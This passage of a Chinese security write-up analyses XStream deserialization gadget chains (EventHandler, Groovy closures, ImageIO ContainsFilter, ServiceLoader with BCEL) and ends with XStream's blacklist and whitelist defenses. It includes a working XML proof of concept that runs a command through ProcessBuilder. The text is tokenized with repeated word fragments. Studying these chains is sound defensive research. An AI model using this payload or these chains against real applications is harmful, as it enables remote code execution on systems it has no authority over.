\u539f\u6709 \u8001 \u7684 \u503c \u3002 \u8fd9\u4e2a \u8fc7\u7a0b \u4f1a \u53bb \u8c03\u7528 key \u7684   compareTo   \u51fd\u6570   3 .   DynamicProxyConverter   \u8fd8 \u9700\u8981 \u63d0\u53ca \u7684 \u662f XStream \u8fd8 \u652f\u6301 \u5bf9 \u52a8\u6001 \u4ee3\u7406 \u7684 \u65b9\u5f0f \u8fdb\u884c \u8fd8\u539f   \u8fd9\u91cc \u7684 \u8fd8\u539f \u8fc7\u7a0b \u4e0d \u8bf4 \u4e86 \uff0c \u6211\u4eec \u4e3b\u8981 \u7684 \u5173\u6ce8 \u5173\u6ce8\u70b9 \u662f \u4f7f\u7528 Proxy \u52a8\u6001 \u4ee3\u7406 \uff0c \u6211\u4eec \u53ef\u4ee5 \u6269\u5c55 \u524d\u9762 \u4e24\u79cd \u7684 \u81ea\u52a8 \u8c03\u7528 \u51fd\u6570 \u8c03\u7528\u51fd\u6570 \u7684 \u653b\u51fb \u653b\u51fb\u9762 \uff0c \u4e0b \u4e00\u7ae0 \u4f1a\u4e3e   EventHandler   \u7684 \u4f8b\u5b50   0x02   \u73b0\u6709 \u51e0\u79cd \u5229\u7528 \u5206\u6790   \u7ed3\u5408 \u4e0a\u9762 \u57fa\u7840 \u77e5\u8bc6 \u57fa\u7840\u77e5\u8bc6 \u4e2d \u63d0\u5230 \u7684 \u51e0\u4e2a Converter \uff0c \u6211\u4eec \u60f3\u8981 \u5229\u7528 XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684\u8bdd \uff0c \u5f97 \u53bb \u5145\u5206 \u5206\u5229 \u5229\u7528 \u5145\u5206\u5229\u7528 \u524d\u9762 \u63d0\u5230 \u7684 \u51e0\u4e2a \u4f1a \u81ea\u52a8 \u8c03\u7528 \u7684 \u51fd\u6570   1 .   EventHandler   XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7528 \u7684 \u6700 \u591a \u7684   EventHandler   \uff0c \u6765 \u770b\u770b \u4ed6 \u7684   invoke   \u51fd\u6570   \u4e3b\u8981 \u5b9e\u73b0 \u5728   invokeInternal   \u51fd\u6570 \u5185   \u9996\u5148 \u9700\u8981 \u5224\u65ad \u6b64\u65f6 \u8c03\u7528 \u7684 \u51fd\u6570 \u662f\u5426 \u4e3a   hashCode   \u3001   equals   \u3001   toString   \uff0c \u5982\u679c \u662f \u7684\u8bdd \uff0c \u91c7\u7528 \u4ee5\u4e0b \u7684 \u65b9\u5f0f \u6765 \u5904\u7406 \u3002   \u4f46\u662f \u6211\u4eec \u9700\u8981 \u5229\u7528 \u7684 \u662f   invokeInternal   \u51fd\u6570 \u540e\u7eed \u7684 \u90e8\u5206 \uff0c \u6240\u4ee5 \u6211\u4eec \u5229\u7528 \u7684 \u65f6\u5019 \u4e0d\u80fd \u7528 \u5b83 \u6765 \u8c03\u7528 \u4e0a\u9762 \u7684 3 \u4e2a \u51fd\u6570 \uff0c   \u610f\u5473 \u610f\u5473\u7740 \u6211 \u524d\u9762 \u63d0\u5230 \u7684   Map   \u7684 \u65b9\u5f0f \uff0c \u4e0d \u9002\u5408 \u7528 \u5728 \u8fd9\u4e2a \u5730\u65b9   \uff1b \u800c   TreeSet   \u8fd9\u79cd \u8c03\u7528   compareTo   \u51fd\u6570 \uff0c \u53ef\u4ee5 \u7528\u6765 \u7ee7\u7eed \u5f80\u4e0b \u4e0b\u8d70 \u5f80\u4e0b\u8d70 \u3002   \u7ee7\u7eed \u5f80\u4e0b \u770b   \u540e\u7eed \u7684 \u5c31\u662f \u7ecf\u5178 \u7684 java \u53cd\u5c04 \u673a\u5236 \u6765 \u5b9e\u73b0 \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \uff0c \u5e76\u4e14 \u8fd9\u91cc \u7684 target \u548c action \u90fd \u662f \u53ef\u63a7 \u7684 \u3002   \u8fd9\u91cc \u9700\u8981 \u6ce8\u610f \u4e00\u4e2a \u95ee\u9898 \u662f \uff0c \u8fd9\u91cc action \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u662f \u6709 \u8981\u6c42 \u7684 \uff08 \u770b 452 \u884c\u5230 461 \u884c \uff09   \u65e0 \u53c2\u6570   \u5355\u4e2a \u53c2\u6570 \uff0c \u4e14 \u53c2\u6570 \u7684 \u7c7b\u578b \u4e3a   Comparable   \uff0c \u5e76\u4e14 \u8fd9\u4e2a action \u51fd\u6570 \u662f \u53ef \u5229\u7528 \u7684   \u7b2c 2 \u79cd \u8fd8 \u6ca1\u6709 \u627e\u5230 \u8fd9\u6837 \u53ef \u5229\u7528 \u7684 \u51fd\u6570 \uff0c \u8fd9\u91cc \u7684 \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \u53ef\u4ee5 \u63d0 \u4e24\u79cd \uff1a   \u914d\u7f6e \u597d cmd \u7684   ProcessBuilder   \uff0c action \u586b   start   \u914d\u7f6e \u597d rmi   url \u7684   JdbcRowSetImpl   \uff0c action \u586b   getDatabaseMetaData   \uff0c \u8fd9\u91cc \u53ef\u4ee5 \u4e3e\u4e00\u53cd\u4e09 \uff0c \u4e3b\u8981 \u601d\u8def \u5c31\u662f \u53ef \u5229\u7528 \u7684 getters   \u73b0\u5728 \u518d \u6765 \u770b\u770b \u5177\u4f53 \u7684   POC   < sorted - set >   < string >   foo   < / string >   < dynamic - proxy >   < ! --   Proxy   \u52a8\u6001 \u4ee3\u7406 \uff0c handler \u4f7f\u7528 EventHandler   -- >   < interface >   java . lang . Comparable   < / interface >   < handler   class =   \" java . beans . EventHandler \"   >   < target   class =   \" java . lang . ProcessBuilder \"   >   < command >   < string >   open   < / string >   < string >   / System / Applications / Calculator . app   < / string >   < / command >   < / target >   < action >   start   < / action >   < / handler >   < / dynamic - proxy >   < / sorted - set >   2 .   Groovy   ConvertedClosure   \u5229\u7528 \u6761\u4ef6   \uff1a groovy   < =   2.4 . 3 \uff0c \u5728 \u540e\u7eed \u7684 \u7248\u672c \u91cc \uff0c   MethodClosure   \u4e0d \u5141\u8bb8 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8c03\u7528 \u3002   \u9664\u4e86 \u4e0a\u9762 \u8fd9\u79cd   EventHandler   \u7684 \u52a8\u6001 \u4ee3\u7406 \u65b9\u5f0f \uff0c Groovy \u7684   ConvertedClosure   \u4e5f \u540c\u6837 \u53ef\u4ee5 \u8fbe\u5230 \u8fd9\u79cd \u6548\u679c   MethodClosure   \u5f53\u524d MethodClosure \u7684 \u4e3b\u8981 \u4f5c\u7528 \u5c31\u662f \u5c01\u88c5 \u6211\u4eec \u9700\u8981 \u6267\u884c \u7684 \u5bf9\u8c61 \uff0c \u6bd4\u5982   new   MethodClosure   (   Runtime   .   getRuntime   ( ) ,   \" exec \"   ) ;   \u5c01\u88c5   Runtime   \u5bf9\u8c61 \uff0c \u5e76 \u8bbe\u5b9a \u540e\u7eed \u9700\u8981 \u8c03\u7528 \u7684 \u51fd\u6570   exec   ConvertedClosure   \u8fd9\u4e2a   ConvertedClosure   \u4e5f \u662f \u7ee7\u627f \u4e86   InvocationHandler   \uff0c \u53ef\u4ee5 \u5728 \u52a8\u6001 \u4ee3\u7406 \u4e2d \u4f5c\u4e3a handler \u7684 \u5b58\u5728 \uff0c \u6765\u770b \u4e00\u4e0b \u4ed6 \u7684 invoke   ConvertedClosure   \u8c03\u7528 \u7684 \u662f \u7236\u7c7b   org . codehaus . groovy . runtime . ConversionHandler # invoke   \u4e3b\u8981 \u770b \u8fd9\u4e2a \u90e8\u5206 \uff0c \u5bf9\u4e8e \u5f53\u524d \u8c03\u7528 \u7684 \u51fd\u6570 \uff0c \u5982\u679c \u975e Object \u7684 \u51fd\u6570 ( \u5982 toString \u3001 hashCode \u7b49 ) \uff0c \u5e76\u4e14 \u4e0d\u662f   GroovyObject   \u7684 \u51fd\u6570 \uff0c \u4f1a \u53bb \u8c03\u7528 \u5b50\u7c7b \u7684   invokeCustom   \uff0c \u8fd9\u91cc \u770b   org . codehaus . groovy . runtime . ConvertedClosure # invokeCustom   \u8fd9\u91cc \u7684 \u5c5e\u6027 \u90fd \u662f \u53ef\u63a7 \u7684 \uff0c \u4e5f \u5c31 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u53ef\u4ee5 \u53bb \u8c03\u7528 \u53bb \u8c03\u7528 \u524d\u9762 \u6784\u9020 \u597d \u7684   MethodClosure   \uff0c \u8fd9\u91cc \u540e\u7eed \u8c03\u7528   call   \u7684 \u8fc7\u7a0b \u53ef\u4ee5 \u770b \u6700\u8fd1 \u7684 \u8fd9\u7bc7   \u6587\u7ae0   \u6240\u4ee5 \u4e3a\u4e86 \u6ee1\u8db3 \u80fd \u8c03\u7528   invokeCustom   \u51fd\u6570 \uff0c \u524d\u9762 \u7684 \u4e24\u79cd   MapConverter   \u548c   TreeSetConverter   \uff0c \u9009 \u54ea\u79cd \u5462 \uff1f   \u5f88 \u660e\u663e \u7b54\u6848 \u662f \u9009\u62e9   TreeSetConverter   \uff0c \u56e0\u4e3a   Map   \u4f1a \u53bb \u8c03\u7528   hashCode   \uff0c \u800c   TreeSet   \u4f1a \u53bb \u8c03\u7528   compareTo   \uff0c \u8fd9\u91cc \u7684   hashCode   \u662f Object \u7684 \u51fd\u6570 \uff0c \u8fc7 \u4e0d\u4e86 \u4e0a\u9762   checkMethod   \uff0c \u5177\u4f53 \u600e\u4e48 \u5199 POC \uff0c \u4e0d \u8be6\u7ec6 \u8bf4 \u4e86 \uff0c \u89c1   ysomap   PS \uff1a \u8fd9\u91cc \u9700\u8981 \u63d0 \u4e00\u4e0b \u7684 \u662f \u7531\u4e8e   compareTo   \u4f1a \u5e26\u4e0a \u4e00\u4e2a \u53c2\u6570 \uff0c \u6240\u4ee5 \u6211\u4eec   MethodClosure   \u5c01\u88c5 \u7684 \u540e\u7eed \u9700\u8981 \u8c03\u7528 \u7684 \u51fd\u6570 \u5fc5\u987b \u8981 \u5b58\u5728 \u4e00\u4e2a String \u7c7b\u578b \u7684 \u53c2\u6570 \uff0c \u4e0d\u7136 \u4f1a \u627e \u4e0d\u5230 \u51fd\u6570 \u62a5\u9519 \u3002 \uff08 \u53ef\u80fd \u8fd8\u6709 \u5176\u4ed6 \u7684 \u89e3\u51b3 \u65b9\u6cd5 \uff0c \u8fd9\u91cc \u6211 \u6ca1 \u7ee7\u7eed \u6df1\u5165 \u4e0b\u53bb \u4e86 \uff0c \u76f4\u63a5 \u6784\u9020   Runtime . exec   \u53ef\u4ee5 \u89e3\u51b3 \u8fd9\u4e2a \u95ee\u9898 \uff09   3 .   Groovy   Expando   \u524d\u9762 \u7528\u5230 \u4e86   TreeSet   \u7684 \u65b9\u5f0f \uff0c \u8fd9\u91cc \u6211\u4eec \u53bb \u4f7f\u7528   Map   \u7684 \u7c7b\u578b \u6765 \u89e6\u53d1 \u3002 \u4ee5   Map   \u7684 \u7c7b\u578b \u6765 \u89e6\u53d1 \uff0c \u90a3 \u5c31\u662f \u627e \u53ef\u4ee5 \u5229\u7528 \u7684   hashCode   \u51fd\u6570   groovy . util . Expando # hashCode   \u5982\u679c \u5728 \u7c7b \u5c5e\u6027   expandoProperties   \u4e2d \u5b58\u5728   hashCode : methodclosure   \u7684 \u5185\u5bb9 \uff0c \u6211\u4eec \u53ef\u4ee5 \u5728 \u8fd9\u91cc \u76f4\u63a5 \u8c03\u7528   MethodClosure   \u7684   call   \u51fd\u6570 \uff0c \u8ddf \u4e0a\u9762   ConvertedClosure   \u540e\u7eed \u7684 \u8c03\u7528 \u4e00\u6837 \uff0c \u4f46\u662f \u8fd9\u91cc \u8c03\u7528 \u65f6 \u6ca1\u6709 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u8fc7\u6765 \uff0c \u6240\u4ee5 \u8fd9\u91cc \u7684 \u601d\u8def \u662f   ProcessBuilder . start   \u6216\u8005 fastjson \u90a3\u79cd getters \u7684 \u5229\u7528 \uff0c \u89c1   POC   4 .   ImageIO $ ContainsFilter   \u4e0a\u9762 \u4f7f\u7528 \u52a8\u6001 \u4ee3\u7406 \u7684 \u65b9\u5f0f \u5229\u7528 \u4e86   TreeSet   \u8c03\u7528 put \u65f6 \u89e6\u53d1 \u7684   compareTo   \uff0c \u800c \u8fd9\u91cc \u5229\u7528 \u7684 \u662f   HashMap   \u7c7b\u578b put \u65f6 \u8c03\u7528 \u7684   hashCode   \u51fd\u6570 \uff1b \u8fd9\u4e2a \u94fe \u76f8\u5bf9 \u6765\u8bf4 \u76f8\u5bf9\u6765\u8bf4 \u590d\u6742 \u4e00\u70b9 \uff0c \u6211\u4eec \u4e00\u70b9 \u4e00\u70b9 \u4e00\u70b9\u4e00\u70b9 \u6765\u8bf4 \uff08 \u53c2\u8003 marshalsec \u7684   ImageIO   \uff0c \u8fd9\u91cc \u5148\u819c \u4e00\u6ce2 \u5927\u4f6c \u7684 \u601d\u8def \uff0c \u540e\u6587\u4e3a \u987a\u52bf \u4e0b\u53bb \u8bb2\u4e0b\u53bb \u7684 \uff0c \u4e3b\u8981 \u76ee\u7684 \u662f \u5230\u8fbe   Iterator . next   \uff0c \u5b9e\u9645 \u6316\u6398 \u8fd9\u79cd \u94fe \u8fd8\u662f \u5f97 \u4ece \u540e \u5f80\u524d \u627e \uff09 \uff1a   \u4ece XStream \u5904\u7406   Map   \u7c7b\u578b \u65f6 \u89e6\u53d1   hashCode   \u5f00\u59cb   \u5173\u6ce8   jdk . nashorn . internal . objects . NativeString # hashCode   \u540e\u7eed \u8c03\u7528   getStringValue   \u51fd\u6570 \uff0c \u5728 \u8fd9\u4e2a \u51fd\u6570 \u91cc \u53bb \u8c03\u7528 \u4e86   this . value . toString ( )   \uff0c \u8fd9\u91cc \u7684 value \u7684 \u7c7b\u578b \u4e3a   CharSequence   \uff0c \u6240\u4ee5 \u6211\u4eec \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u8981 \u627e \u53ef\u4ee5 \u5229\u7528 \u7684   CharSequence   \u7684 \u5b9e\u73b0 \u7c7b \uff0c \u8fd9\u91cc \u7528\u5230 \u7684 \u662f   com . sun . xml . internal . bind . v2 . runtime . unmarshaller . Base64Data # toString   \u51fd\u6570   \u8fd9\u91cc \u7d27\u63a5 \u63a5\u7740 \u7d27\u63a5\u7740 \u4f1a \u53bb \u8c03\u7528   ByteArrayOutputStreamEx   \u7684   readFrom   \uff0c \u8fd9\u4e2a \u51fd\u6570 \u7528\u5230 \u7684 \u4e3b\u8981 \u662f \u8fd9\u8fb9 \u4f20\u5165 \u7684 InputStream \u7684 read \u51fd\u6570   \u5b9e\u9645 \u5b9e\u9645\u4e0a   is   \u6211\u4eec \u662f \u53ef\u4ee5 \u63a7\u5236 \u7684 \uff0c \u56e0\u4e3a \u8fd9\u91cc \u8c03\u7528 \u7684   this . dataHandler . getDataSource ( ) . getInputStream ( )   \uff0c \u4ed6 \u7684 \u503c \u4f20\u9012 \u90fd \u53ef\u4ee5 \u7528\u7c7b \u5c5e\u6027 \u7684 \u65b9\u5f0f \u628a \u4ed6 \u6784\u5efa \u51fa\u6765 \uff0c \u5206\u522b \u662f   1 .   this . dataHandler   = =   \u6784\u9020 \u597d \u7684 DataHandler   2 .   DataHandler \u7684 dataSource \u5c5e\u6027   = =   \u6784\u9020 \u597d \u7684 XmlDataSource   3 .   XmlDataSource \u8c03\u7528 getInputStream ( ) \u51fd\u6570 \u8fd4\u56de \u6784\u9020 \u597d \u7684 inputStream   / /   com . sun . xml . internal . ws . encoding . xml . XMLMessage $ XmlDataSource   \u7528 \u8fd9\u79cd \u65b9\u6cd5 \u5c31 \u53ef\u4ee5 \u83b7\u53d6 \u4e00\u4e2a \u53ef\u63a7 \u7684   inputStream   \uff0c \u5e76\u4e14 \u540e\u7eed \u4f1a \u53bb \u8c03\u7528   read   \u51fd\u6570   \u7ee7\u7eed \u770b \u4e0b\u53bb \uff0c   javax . crypto . CipherInputStream # read   \u6b64\u65f6 \u9700\u8981 \u6784\u9020 \u4e00\u4e2a   Cipher   \u7c7b\u578b \uff0c \u5e76\u4e14 \u540e\u7eed \u8c03\u7528   Cipher . update   \u51fd\u6570 \uff0c \u8fd9\u91cc \u53ef\u4ee5 \u7528   javax . crypto . NullCipher   \u6765 \u586b\u5145 \uff0c \u56e0\u4e3a \u6700\u7ec8 \u7528\u5230 \u7684 \u662f \u7236\u7c7b   Cipher . update   \uff0c \u53ea\u8981 \u4e0d \u91cd\u8f7d   update   \uff0c \u5176\u4ed6 \u7684 \u5b50\u7c7b \u4e5f \u53ef\u4ee5 \u3002   \u7ee7\u7eed \u770b   Cipher . update   \u8bf4 \u4e86 \u90a3\u4e48 \u4e45 \uff0c \u6211\u4eec \u7ec8\u4e8e \u5230 \u4e86 \u81f3\u5173 \u91cd\u8981 \u81f3\u5173\u91cd\u8981 \u7684 \u4e00\u4e2a \u5730\u65b9 \uff0c   serviceIterator . next   \u51fd\u6570   \u540e\u7eed \u6211\u4eec \u5c06 \u8c03\u7528 ImageIO \u4e0b \u7684   javax . imageio . spi . FilterIterator # next   advance   \u51fd\u6570 \u4f1a \u53bb \u8c03\u7528   filter . filter   \u51fd\u6570 \uff0c \u800c ImageIO \u5b58\u5728 \u4e00\u4e2a \u6709\u8da3 \u7684 filter   javax . imageio . ImageIO . ContainsFilter # filter   \u6211\u4eec \u53ef\u4ee5 \u6307\u5b9a \u4e00\u4e2a Method \u5bf9\u8c61 \u53bb invoke \uff0c \u5230 \u4e86 \u8fd9\u91cc \u5c31\u662f \u6fc0\u52a8 \u52a8\u4eba \u4eba\u5fc3 \u6fc0\u52a8\u4eba\u5fc3 \u7684 Java \u53cd\u5c04 \u673a\u5236 \u4e86 \uff0c \u6211\u4eec \u63d0\u524d \u6784\u9020 \u597d method \u5bf9\u8c61 \uff0c \u5c31 \u53ef\u4ee5 \u8c03\u7528 \u4efb\u610f \u7684 \u51fd\u6570 \u3002   \u5229\u7528 \u94fe \u6bd4\u8f83 \u957f \uff0c \u6574\u7406 \u4e00\u4e0b \u8fc7\u7a0b   XStream   \u5904\u7406 Map \u7c7b\u578b   \u53bb \u8c03\u7528 jdk . nashorn . internal . objects . NativeString # hashCode   com . sun . xml . internal . bind . v2 . runtime . unmarshaller . Base64Data # toString   javax . activation . DataHandler # getDataSource   com . sun . xml . internal . ws . encoding . xml . XMLMessage $ XmlDataSource # getInputStream   javax . crypto . CipherInputStream # read   - >   getMoreData   javax . crypto . NullCipher # update   - >   chooseFirstProvider   javax . imageio . spi . FilterIterator # next   javax . imageio . ImageIO . ContainsFilter # filter   ProcessBuilder # start   \u4ece \u540e\u9762 \u5f80\u524d \u770b \u7684\u8bdd \uff0c \u6211\u4eec \u524d\u9762 \u505a \u7684 \u6240\u6709 \u64cd\u4f5c \u90fd \u662f \u4e3a\u4e86 \u80fd \u53bb \u89e6\u53d1   Iterator . next   \uff0c \u800c \u8fd9\u79cd   Iterator   \u7684 \u904d\u5386 \u5904\u7406 \uff0c \u6211\u4eec \u5f88 \u5bb9\u6613 \u518d \u627e\u5230 \u4e00\u5904 \uff0c \u4e0b \u4e00\u8282 \u5c31\u662f \u4e0d\u7528   javax . imageio . ImageIO . ContainsFilter # filter   \u6765 \u5b9e\u73b0 \u5229\u7528 \uff0c \u8bf7 \u7ee7\u7eed \u5f80\u4e0b \u770b XD   5 .   ServiceFinder $ LazyIterator   \u601d\u8def \u6765\u81ea   \u6587\u7ae0 1   \u3001   \u6587\u7ae0 2   \u5148 \u6765\u770b \u4e00\u4e0b   java . util . ServiceLoader . LazyIterator # next   \u5f53\u7c7b \u5c5e\u6027   acc   \u4e3a \u7a7a\u65f6 \uff0c \u4f1a \u53bb \u8c03\u7528   nextService   \u51fd\u6570 \uff0c \u800c \u5728 \u8be5 \u51fd\u6570 \u91cc\u9762 \uff0c \u6211\u4eec \u770b\u5230 \u4e86 \u4ee4\u4eba \u719f\u6089 \u7684   Class . forName   \u7684 \u8c03\u7528 \u3002 \u5e76\u4e14 \u6211\u4eec \u53bb \u5b9e\u4f8b \u5316 \u7684   classname   \u3001   loader   \uff0c \u90fd \u662f \u7c7b \u5c5e\u6027 \uff0c \u5c5e\u4e8e \u6211\u4eec \u53ef\u4ee5 \u63a7\u5236 \u7684 \u4e1c\u897f \u3002   \u5230 \u4e86 \u8fd9\u91cc \u81ea\u7136 \u7136\u800c \u81ea\u7136\u800c\u7136 \u7684 \u5c31 \u60f3\u5230 \u4e86 \u4f7f\u7528 BCEL \u7684 ClassLoader \u6765 \u8f7d\u5165 classname \u91cc \u7684 \u5b57\u8282 \u7801 \u4e86 ( \u8fd9\u91cc \u6211 \u5728 fastjson \u90a3\u7bc7\u91cc \u63d0\u5230 \u8fc7 ) \u3002   \u6240\u4ee5 \u6211\u4eec \u53ef\u4ee5 \u5728 ImageIO \u90a3\u6761 \u94fe \u7684 \u57fa\u7840 \u4e0a \uff0c \u5728 \u89e6\u53d1   Iterator . next   \u65f6 \u4f7f\u7528 \u8fd9\u4e2a   LazyIterator   \u6765 \u4ee3\u66ff   \u4fee\u6539 BCEL   ClassLoader \u6784\u9020 POC   \u8fd9\u91cc \u6765 \u63d0 \u4e00\u4e0b \u5173\u4e8e POC \u7684 \u6784\u9020 \uff0c \u5982\u679c \u4f60 \u4f7f\u7528 \u4e86 \u5f53\u524d \u8fd9\u4e2a \u5229\u7528 \u94fe \uff0c \u5e76\u4e14 \u4e0d \u5bf9   ClassLoader   \u505a \u5904\u7406 \u7684\u8bdd \uff0c \u4f60 \u4f1a \u53d1\u73b0 \u600e\u4e48 \u90fd \u6253 \u4e0d\u901a \uff0c \u56e0\u4e3a \u8fd9\u91cc \u5728 \u5b9e\u9645 \u8fd8\u539f   ClassLoader   \u7684 \u65f6\u5019 \u51fa\u73b0 \u4e86 \u9519\u8bef   \u8fd9\u91cc \u6709 \u4e24\u79cd \u89e3\u51b3 \u65b9\u6848 \u89e3\u51b3\u65b9\u6848 \uff0c \u4e00\u662f \u53bb\u9664 \u8fd9\u79cd \u8fd8 \u539f\u6709 \u95ee\u9898 \u7684 \u7c7b \uff08 \u4f1a \u5f88 \u9ebb\u70e6 \uff09 \uff0c \u4e8c\u662f \u76f4\u63a5 \u628a   ClassLoader   \u91cc \u7684 \u4e00\u4e9b \u65e0\u5173 \u5173\u7d27 \u7d27\u8981 \u65e0\u5173\u7d27\u8981 \u7684 \u4e1c\u897f \u5254\u9664 \u6389 \u3002   \u8fd9\u91cc \u6211 \u9009\u62e9 \u4e86 \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \uff0c \u7ecf\u8fc7 \u8c03\u8bd5 \u53bb \u9664\u4e86 \u4ee5\u4e0b \u51e0\u4e2a \u5c5e\u6027 \u7684 \u503c   \u8fd9\u91cc \u7531\u4e8e \u6211\u4eec \u5254\u9664 \u4e86   ignored _ packages   \u548c   deferTo   \uff0c \u5bfc\u81f4 BCEL \u7684 ClassLoader \u5728 \u8f7d\u5165 \u666e\u901a \u7684 \u7c7b \u7684 \u65f6\u5019 \u4f1a \u51fa\u73b0 \u52a0\u8f7d \u9519\u8bef \u7684 \u95ee\u9898   \u6765 \u770b\u770b \u600e\u4e48 \u89e3\u51b3 \u8fd9\u4e2a \u95ee\u9898   \u9996\u5148 BCEL \u7684   ClassLoader . loadClass   \uff0c \u4e00\u5171 \u5c1d\u8bd5 4 \u6b21 \u4e0d\u540c \u7684 \u8f7d\u5165 \u65b9\u6cd5   \u4ece \u5f53\u524d ClassLoader \u7684 classes \u53bb \u627e   \u5bf9\u4e8e \u9ed8\u8ba4 \u5ffd\u7565 \u7684 \u5305   java . / sun . / javax .   \uff0c \u4f7f\u7528   deferTo   \u53bb \u91cd\u65b0 \u52a0\u8f7d \uff0c \u8fd9\u91cc \u7684   deferTo   \u662f \u7cfb\u7edf \u7684 ClassLoader \uff08   ClassLoader . getSystemClassLoader ( )   )   \u5bf9\u4e8e classname \u4ee5   $ $ BCEL $ $   \u5f00\u5934 \u7684 \uff0c \u6839\u636e classname \u7684 \u503c \u53bb defineClass \uff0c \u8fd9\u8fb9 \u5c31\u662f \u6211\u4eec \u6700 \u559c\u6b22 \u7684 \u4efb\u610f \u8f7d\u5165 \u5b57\u8282 \u7801 \u7684 \u5730\u65b9   \u6700\u540e \u4e00\u6b21 \u662f \u7528   repository   \u53bb \u8f7d\u5165 \u5f53\u524d \u7684 classname \uff0c \u5982\u679c \u8fd9\u91cc \u8fd8 \u6ca1 \u627e\u5230 \uff0c \u5c31 \u4f1a \u7206 \u6ca1\u6709 \u627e\u5230 Class \u7684 \u9519\u8bef   PS \uff1a \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206   repository   \u53d6 \u7684   SyntheticRepository . getInstance ( )   \uff0c \u8fd8 \u4e0d\u662f \u5f88 \u6e05\u695a \u8fd9\u4e2a \u5de6\u53f3 \uff0c \u540e\u7eed \u6574\u7406 \u4e00\u4e0b ClassLoader \u76f8\u5173 \u7684 \u77e5\u8bc6 \u518d \u505a \u8865\u5145   \u518d \u6765\u770b \u6211\u4eec \u62a5\u9519 \u7684 \u539f\u56e0 \uff0c \u56e0\u4e3a \u5220\u9664   ignored _ packages   \u548c   deferTo   \u4e4b\u540e \uff0c \u76f8\u5f53 \u5f53\u4e8e \u76f8\u5f53\u4e8e \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u60c5\u51b5 \u65e0\u6cd5 \u8f7d\u5165 \u4e86 \uff0c \u800c \u663e\u7136   java . lang . Object   \u4e0d \u7b26\u5408 \u7b2c\u4e09 \u4e09\u79cd \u7b2c\u4e09\u79cd \u60c5\u51b5 \u3002 \u6700\u540e \u7b2c 4 \u79cd \u91cc\u9762 \u4e5f \u6ca1\u6709 \u627e\u5230 \u8fd9\u4e2a   java . lang . Object   \uff0c \u6240\u4ee5 \u6700\u7ec8 \u7206 \u4e86   ClassNotFoundException   \u8fd9\u91cc \u5176\u5b9e \u5df2\u7ecf \u5f88 \u660e\u663e \u4e86 \uff0c \u89e3\u51b3 \u8fd9\u4e2a \u95ee\u9898 \uff0c \u6211\u4eec \u5f97 \u5728   classes   \u91cc \u6dfb\u52a0 \u6211\u4eec \u4f20\u5165 \u7684 class \u5b57\u8282 \u7801\u91cc \u6240\u7528 \u5230 \u7684 \u6240\u6709 \u7c7b \uff0c \u90a3\u4e48 \u5728 \u7b2c\u4e00 \u4e00\u6b21 \u7b2c\u4e00\u6b21 \u5c1d\u8bd5 \u8f7d\u5165 \u7684 \u65f6\u5019 \uff0c \u5c31 \u627e\u5230 \u4e86 \u76f8\u5e94 \u7684 \u7c7b \uff0c \u65e0\u9700 \u5c1d\u8bd5 \u540e\u7eed \u7684 \u51e0\u79cd \u8f7d\u5165 \u65b9\u5f0f \u3002   \u6bd4\u5982 \u8fd9\u91cc \u6211 \u4ea7\u751f \u7684 \u5b57\u8282 \u7801 \u91cc\u9762 \u7528 \u4e0a \u4e86   Runtime   \uff0c \u5c31 \u5f97 \u52a0\u4e0a \u8fd9\u4e2a \u7c7b   \u8fd9\u91cc \u7684 Object \u5fc5\u987b \u52a0\u4e0a \uff0c \u6bd5\u7adf \u6240\u6709 \u7684 \u5bf9\u8c61 \u90fd \u7ee7\u627f \u81ea Object   0x03   XStream \u7684 \u9632\u5fa1 \u63aa\u65bd   XStream \u5728 1.4 . 7 \u7248\u672c \u4e4b\u540e \u652f\u6301 \u4f7f\u7528 \u540d\u5355 \u767d\u540d\u5355 \u548c \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7684 \u65b9\u5f0f \u6765 \u65b9\u5f0f \u6076\u610f \u7c7b \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   security   Starting   with   XStream   1.4 . 7 ,   it   is   possible   to   define   permissions   for   types ,   to   check   the   type   of   an   object   that   should   be   unmarshalled .   Those   permissions   can   be   used   to   allow   or   deny   types   explicitly   With   these   permissions   it   is   at   least   not   possible   to   inject   unexpected   types   into   an   object   graph .   The   security   framework   supports   the   setup   of   a   black   or   white   listing   scenario .   Any   application   should   use   this   feature   to   limit   the   danger   of   arbitrary   command   execution   if   it   deserializes   data   from   an   external   source .   XStream   itself   sets   up   a   black   list   by   default ,   i . e .   it   blocks   all   currently   known   critical   classes   of   the   Java   runtime .   Main   reason   for   the   black   list   is   compatibility ,   because   otherwise   newer   versions   of   XStream   1.4 . x   can   no   longer   be   used   as   drop - in   replacement .   Unfortunately   this   provides   a   false   sense   of   security .   Every   XStream   client   should   therefore   switch   to   a   white   listing   on   its   own   as   soon   as   possible .   XStream   itself   will   use   white   listing   as   default   starting   with   1.5 . x   and   only   clients   that   have   also   changed   their   setup   will   be   able   to   use   this   newer   version   again   as   drop - in   replacement .   \u8fd9\u91cc \u4e3b\u8981 \u770b \u4e00\u4e0b \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7684 \u5904\u7406   1.4 . 7 - 1.4 . 9   EventHandler   \u7684 \u5904\u7406 \u7531   ReflectionConverter   \u6765 \u5904\u7406 \u7684 \uff0c \u5728 1.4 . 7 - 1.4 . 9 \u7248\u672c \uff0c \u5728   canConvert   \u5904 \u6dfb\u52a0 \u4e86 \u5bf9   EventHandler   \u7684 \u9650\u5236   \u6240\u4ee5   EventHandler   \u7684 POC \u5c31 \u5931\u6548 \u4e86 \uff0c \u4f46\u662f \u5176\u4ed6 \u7684 \u51e0\u79cd \u5e76 \u6ca1\u6709 \u5931\u6548   > = 1.4 . 10   \u5728 1.4 . 10 \u7248\u672c \u589e\u52a0 \u4e86   setupDefaultSecurity   